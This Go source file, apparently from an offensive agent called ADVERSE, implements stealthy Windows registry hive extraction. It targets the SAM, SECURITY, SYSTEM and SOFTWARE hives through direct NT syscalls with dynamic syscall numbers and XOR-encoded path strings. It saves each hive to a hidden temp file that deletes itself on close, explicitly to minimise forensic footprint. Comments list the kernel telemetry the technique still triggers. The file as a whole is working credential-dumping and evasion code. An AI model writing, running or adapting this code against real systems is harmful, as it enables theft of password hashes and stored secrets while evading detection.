//go:build windows

// Package registrywin provides Windows registry hive extraction for the ADVERSE agent.
//
// This file implements REAL registry hive extraction on Windows.
// All NT API calls go through the dynamic-SSN trampoline path (no hardcoded SSNs).
// String constants referencing registry paths are decoded from the stealth XOR
// table at runtime — no plaintext path literals in .rodata. HONEST LIMITATION:
// Go strings are immutable, so decoded path strings cannot be zeroized in
// place; the plaintext copy remains on the heap until GC. The XOR table itself
// holds only encoded bytes. Intermediate read buffers ARE explicitly zeroed
// (see readHiveFileViaSyscall); the accumulated extraction result is the
// payload and is retained by the caller.
//
// REAL EXTRACTION REQUIREMENTS:
//   - real_mode:true in config JSON
//   - GOOS=windows (compile gate)
//
// HONEST RESIDUAL RISK — kernel telemetry observes all operations:
//   - CmRegisterCallbackEx fires for NtOpenKey, NtSaveKey (Sysmon 12/13/14)
//   - File-create telemetry fires for the temp file (Sysmon 11)
//   - ETW-TI kernel provider monitors registry + file operations
//   - MDE behavior monitoring / Defender AV observes all
//   - The temp file generates transient MFT/USN records on create; the read
//     handle opens with FILE_FLAG_DELETE_ON_CLOSE, so the file is removed by
//     the I/O manager on handle close (crash-safe) rather than lingering.
//     FILE_ATTRIBUTE_TEMPORARY remains as a reboot-time fallback. Deletion
//     itself still produces an MFT/USN delete record — residue, not absence.
//
// NT CALL SEQUENCE:
//  1. NtOpenProcessToken(NtCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &tokenHandle)
//  2. NtAdjustPrivilegesToken(tokenHandle, 0, &TOKEN_PRIVILEGES{1, {17,0}, SE_PRIVILEGE_ENABLED}, 0, nil, nil)
//  3. NtOpenKey(&keyHandle, KEY_READ, &OBJECT_ATTRIBUTES{<hive path>})
//  4. NtCreateFile(&fileHandle, FILE_GENERIC_READ|FILE_GENERIC_WRITE, &OBJECT_ATTRIBUTES{<temp path>},
//     &ioStatusBlock, nil, FILE_ATTRIBUTE_TEMPORARY|FILE_ATTRIBUTE_HIDDEN,
//     FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, FILE_CREATE,
//     FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, nil, 0)
//  5. NtSaveKey(keyHandle, fileHandle)
//  6. Reopen with FILE_GENERIC_READ|FILE_DELETE and
//     FILE_FLAG_DELETE_ON_CLOSE (fallback: FILE_GENERIC_READ without the flag);
//     NtReadFile loop with explicit BytePosition
//  7. Verify "regf" header on extracted bytes
//  8. NtClose(readHandle) deletes the temp file via DELETE_ON_CLOSE;
//     NtClose(keyHandle)
//  9. Zeroize the intermediate NtReadFile buffer after copying into the result.
//     The accumulated result is the extraction payload and is deliberately
//     retained/returned (not zeroized here).
package registrywin

import (
	"fmt"
	"os"
	"runtime"
	"unsafe"

	"github.com/ashwnn/adverse-go/internal/audit"
	"github.com/ashwnn/adverse-go/internal/stealth"
	"github.com/ashwnn/adverse-go/internal/syscalls"
)

// extractReal performs real registry hive extraction on Windows.
// Requires real_mode:true in config and SeBackupPrivilege.
//
// Kernel telemetry is NOT bypassed — see package doc for full list.
func (e *Extractor) extractReal(hiveName string) ([]byte, error) {
	// Force-decode stealth strings to ensure they're in .rodata at startup.
	_ = stealth.NtdllName()

	invoker := syscalls.GetInvoker()

	// ─── Step 1: Enable SeBackupPrivilege ───────────────────────────────────
	if err := syscalls.EnableSeBackupPrivilege(invoker); err != nil {
		return nil, fmt.Errorf("enable SeBackupPrivilege: %w", err)
	}

	// ─── Step 2: Open hive root key via NtOpenKey ──────────────────────────
	hivePath := hivePathForName(hiveName)
	if hivePath == "" {
		return nil, fmt.Errorf("unknown hive: %s", hiveName)
	}

	// hivePath is a Go string decoded from the stealth XOR table. Strings are
	// immutable copies, so the decoded plaintext cannot be zeroized in place —
	// it remains on the heap until GC (the table itself stays encoded).
	// ObjectAttributesFromNameOwned makes its own UTF-16 copy (NameBuf) that
	// backs the syscall; it is kept alive for the call and then released to GC.
	oaOwned := syscalls.ObjectAttributesFromNameOwned(hivePath)
	oa := oaOwned.OA

	var keyHandle uintptr
	status, err := invoker.Invoke(syscalls.SysNtOpenKey,
		uintptr(unsafe.Pointer(&keyHandle)), // arg0: &keyHandle
		uintptr(syscalls.KEY_READ),          // arg1: DesiredAccess
		uintptr(unsafe.Pointer(&oa)),        // arg2: &ObjectAttributes
	)
	runtime.KeepAlive(oaOwned.NameBuf)
	runtime.KeepAlive(oaOwned.NameUS)
	runtime.KeepAlive(&oa)
	if err != nil {
		return nil, fmt.Errorf("NtOpenKey(%s): %w", hiveName, err)
	}
	if !syscalls.NT_SUCCESS(status) {
		return nil, fmt.Errorf("NtOpenKey(%s) failed: NTSTATUS 0x%08X (%s)",
			hiveName, status, syscalls.NTStatusString(status))
	}
	defer invoker.Invoke(syscalls.SysNtClose, keyHandle)

	// ─── Step 3: Create temp file via NtCreateFile ──────────────────────────
	tmpPath := GenerateTempNTPath(os.TempDir())
	tmpOwned := syscalls.ObjectAttributesFromNameOwned(tmpPath)
	tmpOA := tmpOwned.OA

	var fileHandle uintptr
	var ioSt syscalls.IoStatusBlock

	status, err = invoker.Invoke(syscalls.SysNtCreateFile,
		uintptr(unsafe.Pointer(&fileHandle)),                            // arg0: &fileHandle
		uintptr(syscalls.FILE_GENERIC_READ|syscalls.FILE_GENERIC_WRITE), // arg1: DesiredAccess
		uintptr(unsafe.Pointer(&tmpOA)),                                 // arg2: &ObjectAttributes
		uintptr(unsafe.Pointer(&ioSt)),                                  // arg3: &IoStatusBlock
		0,                                                               // arg4: AllocationSize (nil)
		uintptr(syscalls.FILE_ATTRIBUTE_TEMPORARY|syscalls.FILE_ATTRIBUTE_HIDDEN),              // arg5: FileAttributes
		uintptr(syscalls.FILE_SHARE_READ|syscalls.FILE_SHARE_WRITE|syscalls.FILE_SHARE_DELETE), // arg6: ShareAccess
		uintptr(syscalls.FILE_CREATE), // arg7: CreateDisposition
		uintptr(syscalls.FILE_NON_DIRECTORY_FILE|syscalls.FILE_SYNCHRONOUS_IO_NONALERT), // arg8: CreateOptions
		0, // arg9: EaBuffer (nil)
		0, // arg10: EaLength
	)
	runtime.KeepAlive(tmpOwned.NameBuf)
	runtime.KeepAlive(tmpOwned.NameUS)
	runtime.KeepAlive(&tmpOA)
	if err != nil {
		return nil, fmt.Errorf("NtCreateFile(temp): %w", err)
	}
	if !syscalls.NT_SUCCESS(status) {
		return nil, fmt.Errorf("NtCreateFile(temp) failed: NTSTATUS 0x%08X (%s)",
			status, syscalls.NTStatusString(status))
	}

	// ─── Step 4: Save hive to file via NtSaveKey ────────────────────────────
	status, err = invoker.Invoke(syscalls.SysNtSaveKey, keyHandle, fileHandle)
	if err != nil {
		invoker.Invoke(syscalls.SysNtClose, fileHandle)
		return nil, fmt.Errorf("NtSaveKey: %w", err)
	}
	if !syscalls.NT_SUCCESS(status) {
		invoker.Invoke(syscalls.SysNtClose, fileHandle)
		return nil, fmt.Errorf("NtSaveKey failed: NTSTATUS 0x%08X (%s)",
			status, syscalls.NTStatusString(status))
	}

	// ─── Step 5: Read file into memory via NtReadFile loop ──────────────────
	// Position is at EOF after NtSaveKey. Close and reopen to read from offset 0.
	invoker.Invoke(syscalls.SysNtClose, fileHandle)
	fileHandle = 0

	// Re-open for reading.
	// The read handle requests DELETE access and FILE_FLAG_DELETE_ON_CLOSE:
	// when this handle closes, the temp file is removed by the I/O manager
	// itself, so no hive file can survive the operation — even on a crash
	// after the reopen (the file is deleted on handle close) or between the
	// save and the reopen (FILE_ATTRIBUTE_TEMPORARY auto-cleans at reboot,
	// and cleanupTempFile below is the belt-and-braces path).
	reopenOwned := syscalls.ObjectAttributesFromNameOwned(tmpPath)
	reopenOA := reopenOwned.OA
	var readHandle uintptr
	var reopenSt syscalls.IoStatusBlock

	reopenAccess := uintptr(syscalls.FILE_GENERIC_READ | syscalls.FILE_DELETE)
	reopenOptions := uintptr(syscalls.FILE_NON_DIRECTORY_FILE | syscalls.FILE_SYNCHRONOUS_IO_NONALERT | syscalls.FILE_FLAG_DELETE_ON_CLOSE)

	status, err = invoker.Invoke(syscalls.SysNtCreateFile,
		uintptr(unsafe.Pointer(&readHandle)), // arg0: &readHandle
		reopenAccess,                         // arg1: DesiredAccess
		uintptr(unsafe.Pointer(&reopenOA)),   // arg2: &ObjectAttributes
		uintptr(unsafe.Pointer(&reopenSt)),   // arg3: &IoStatusBlock
		0,                                    // arg4: AllocationSize
		0,                                    // arg5: FileAttributes (ignored for OPEN)
		uintptr(syscalls.FILE_SHARE_READ|syscalls.FILE_SHARE_WRITE|syscalls.FILE_SHARE_DELETE), // arg6: ShareAccess
		uintptr(syscalls.FILE_OPEN), // arg7: CreateDisposition (open existing)
		reopenOptions,               // arg8: CreateOptions
		0,                           // arg9: EaBuffer
		0,                           // arg10: EaLength
	)
	runtime.KeepAlive(reopenOwned.NameBuf)
	runtime.KeepAlive(reopenOwned.NameUS)
	runtime.KeepAlive(&reopenOA)
	if err != nil || !syscalls.NT_SUCCESS(status) {
		// Fallback: delete-on-close requires DELETE access, which some
		// configurations deny on reopen. Retry with the legacy plain open;
		// cleanupTempFile still removes the file eagerly.
		if readHandle != 0 {
			invoker.Invoke(syscalls.SysNtClose, readHandle)
			readHandle = 0
		}
		reopenAccess = uintptr(syscalls.FILE_GENERIC_READ)
		reopenOptions = uintptr(syscalls.FILE_NON_DIRECTORY_FILE | syscalls.FILE_SYNCHRONOUS_IO_NONALERT)
		status, err = invoker.Invoke(syscalls.SysNtCreateFile,
			uintptr(unsafe.Pointer(&readHandle)), // arg0: &readHandle
			reopenAccess,                         // arg1: DesiredAccess
			uintptr(unsafe.Pointer(&reopenOA)),   // arg2: &ObjectAttributes
			uintptr(unsafe.Pointer(&reopenSt)),   // arg3: &IoStatusBlock
			0,                                    // arg4: AllocationSize
			0,                                    // arg5: FileAttributes (ignored for OPEN)
			uintptr(syscalls.FILE_SHARE_READ|syscalls.FILE_SHARE_WRITE|syscalls.FILE_SHARE_DELETE), // arg6: ShareAccess
			uintptr(syscalls.FILE_OPEN), // arg7: CreateDisposition (open existing)
			reopenOptions,               // arg8: CreateOptions
			0,                           // arg9: EaBuffer
			0,                           // arg10: EaLength
		)
		runtime.KeepAlive(reopenOwned.NameBuf)
		runtime.KeepAlive(reopenOwned.NameUS)
		runtime.KeepAlive(&reopenOA)
	}
	if err != nil {
		return nil, fmt.Errorf("NtCreateFile(reopen): %w", err)
	}
	if !syscalls.NT_SUCCESS(status) {
		return nil, fmt.Errorf("NtCreateFile(reopen) failed: NTSTATUS 0x%08X (%s)",
			status, syscalls.NTStatusString(status))
	}
	defer func() {
		invoker.Invoke(syscalls.SysNtClose, readHandle)
		cleanupTempFile(tmpPath)
	}()

	// NtReadFile loop with explicit BytePosition
	data, err := readHiveFileViaSyscall(invoker, readHandle)
	if err != nil {
		return nil, fmt.Errorf("read hive data: %w", err)
	}

	// ─── Step 6: Verify regf header ─────────────────────────────────────────
	if err := ValidateRegfHeader(data); err != nil {
		audit.SecureZeroBytes(data)
		return nil, fmt.Errorf("extracted hive invalid: %w", err)
	}

	// ─── Step 7: Store and return ───────────────────────────────────────────
	e.extracted[hiveName] = data
	return data, nil
}

// readHiveFileViaSyscall reads an entire file using NtReadFile with explicit BytePosition.
// Returns the accumulated bytes. Intermediate read buffers are zeroed after copy.
func readHiveFileViaSyscall(invoker *syscalls.SyscallInvoker, handle uintptr) ([]byte, error) {
	const readBufSize = 65536 // 64KB chunks
	readBuf := make([]byte, readBufSize)
	var result []byte
	var offset int64

	for {
		var ioSt syscalls.IoStatusBlock
		var currentOffset int64 = offset

		status, err := invoker.Invoke(syscalls.SysNtReadFile,
			handle,                                  // arg0: FileHandle
			0,                                       // arg1: Event (NULL)
			0,                                       // arg2: ApcRoutine (NULL)
			0,                                       // arg3: ApcContext (NULL)
			uintptr(unsafe.Pointer(&ioSt)),          // arg4: &IoStatusBlock
			uintptr(unsafe.Pointer(&readBuf[0])),    // arg5: Buffer
			uintptr(readBufSize),                    // arg6: Length
			uintptr(unsafe.Pointer(&currentOffset)), // arg7: BytePosition
			0,                                       // arg8: Key (NULL)
		)
		if err != nil {
			audit.SecureZeroBytes(readBuf)
			return result, fmt.Errorf("NtReadFile: %w", err)
		}
		if !syscalls.NT_SUCCESS(status) {
			audit.SecureZeroBytes(readBuf)
			// STATUS_END_OF_FILE (0xC0000010) is expected at EOF
			if status&0xFFFFFFFF == 0xC0000010 {
				break
			}
			return result, fmt.Errorf("NtReadFile failed: NTSTATUS 0x%08X (%s)",
				status, syscalls.NTStatusString(status))
		}

		bytesRead := int(ioSt.Information)
		if bytesRead == 0 {
			break
		}

		// Append copy of read data to result
		chunk := make([]byte, bytesRead)
		copy(chunk, readBuf[:bytesRead])
		result = append(result, chunk...)

		offset += int64(bytesRead)

		// Safety: cap at 256MB to prevent runaway reads
		if len(result) > 256*1024*1024 {
			audit.SecureZeroBytes(readBuf)
			return nil, fmt.Errorf("hive file exceeds 256MB safety limit")
		}
	}

	audit.SecureZeroBytes(readBuf)
	return result, nil
}

// hivePathForName returns the decoded NT registry path for a hive name.
// Paths are decoded from the stealth XOR table at runtime — no plaintext path
// literals in .rodata. The returned Go string is immutable and cannot be
// zeroized in place; it is released to GC by the caller.
func hivePathForName(name string) string {
	switch name {
	case "SYSTEM":
		return stealth.HivePathSystem()
	case "SAM":
		return stealth.HivePathSam()
	case "SECURITY":
		return stealth.HivePathSecurity()
	case "SOFTWARE":
		return stealth.HivePathSoftware()
	default:
		return ""
	}
}

// cleanupTempFile attempts best-effort removal of the temp file.
// On Windows with FILE_ATTRIBUTE_TEMPORARY the file auto-cleans on reboot,
// but we try to remove it eagerly to minimize forensic footprint.
func cleanupTempFile(ntPath string) {
	// Convert NT path (\??\C:\...) to Go path for os.Remove
	goPath := ntPath
	if len(goPath) > 4 && goPath[:4] == "\\??\\" {
		goPath = goPath[4:]
	}
	os.Remove(goPath)
}
